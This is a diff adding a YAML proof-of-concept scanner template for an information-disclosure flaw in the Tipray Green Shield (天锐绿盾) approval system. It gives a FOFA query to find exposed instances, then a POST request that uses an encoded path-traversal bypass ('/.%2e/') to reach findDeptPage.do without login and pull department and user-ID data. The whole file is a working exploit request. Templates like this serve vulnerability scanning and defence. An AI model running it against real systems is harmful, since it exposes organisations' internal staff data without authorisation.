@@ -1,0 +1,21 @@
+id: poc-yaml-tipray-gsas-finddeptpage-do-info-leak
+info:
+  name: 天锐绿盾审批系统 findDeptPage.do 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+requests:
+- method: GET
+  path: /trwfe/login.jsp
+  expression: status_code == 200 && contains(body,"天锐绿盾审批系统")
+- method: POST
+  path: /trwfe/login.jsp/.%2e/dept/findDeptPage.do
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: parentId=1&deptName=&pageVo=1
+  expression: status_code == 200 && contains(body,"\"total\":") && contains(body,"\"parentName\":")
+    && contains(body,"\"parentId\":") && contains(body,"\"userIdArr\":") && !contains(body,"<")
+variables: {}
+transport: http
